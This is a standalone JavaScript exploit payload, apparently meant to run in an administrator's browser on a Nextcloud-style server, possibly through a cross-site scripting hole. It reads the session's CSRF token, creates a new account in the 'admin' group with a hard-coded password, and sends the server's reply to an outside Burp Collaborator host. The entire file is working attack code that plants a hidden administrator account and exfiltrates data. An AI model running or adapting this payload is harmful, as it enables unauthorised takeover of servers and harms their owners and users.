function makeRequest( opts ) {
  return new Promise(function (resolve, reject) {
    var xhr = new XMLHttpRequest();
    if( !opts.method ) opts.method = 'GET';
    xhr.open( opts.method, opts.url);
    if( opts.headers ){
      Object.keys(opts.headers).forEach(function (key) {
        xhr.setRequestHeader(key,opts.headers[key]);
      });
    }
    xhr.onload = function () {
      if (this.status >= 200 && this.status < 300) {
        resolve(xhr.response);
      } else {
        reject({
          status: this.status,
          statusText: xhr.statusText
        });
      }
    };
    xhr.onerror = function () {
      reject({
        status: this.status,
        statusText: xhr.statusText
      });
    };
    if( opts.data ){ 
      console.log('Using',opts.data)
      xhr.send(opts.data);
    }else{
      xhr.send();
    }
  });
}



(function(){
  console.log("Getting CSRF token");
  makeRequest({ url: '/index.php/csrftoken'} )
  .then(function (data) {
    console.log(data);
    token = JSON.parse(data)["token"];
    console.log("Creating new user");
    return makeRequest( { 
      method: 'POST', 
      url:'/ocs/v2.php/cloud/users', 
      headers: {
        "requesttoken":token,
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*"
      },
      data: JSON.stringify({
        "userid":"admin"+Date.now(),
        "password":"PwnlyOffice123!",
        "displayName":"admin",
        "email":"asdasdfasdf@asdfqwqs.com",
        "groups":["admin"],
        "subadmin":[],
        "quota":
        "default",
        "language":"en"
      })
    });
  })
  .then(function (data){
    return makeRequest( { 
      method: 'POST',
      url: 'http://o1qywh01mp97vfjghcngnkgp0g66uv.burpcollaborator.net',
      data: data
    });
  });

})();
